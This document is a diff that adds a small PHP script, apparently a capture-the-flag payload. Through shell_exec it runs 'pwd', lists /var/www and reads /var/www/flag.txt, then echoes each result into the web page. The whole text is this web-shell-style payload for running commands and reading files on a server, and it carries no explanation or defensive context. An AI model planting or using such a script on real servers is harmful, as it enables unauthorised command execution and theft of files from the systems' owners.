@@ -1,0 +1,12 @@
+<?php
+$pwd = shell_exec('pwd 2>&1'); // capture stderr too
+echo "PWD: " . trim($pwd) . PHP_EOL . "<br/> <br/>";
+
+$ls = shell_exec('ls /var/www'); // capture stderr too
+echo "ls  : " . trim($ls) . PHP_EOL . "<br/> <br/>";
+
+$cat = shell_exec('cat /var/www/flag.txt'); // capture stderr too
+echo "flag  : " . trim($cat) . PHP_EOL . "<br/> <br/>";
+
+
+
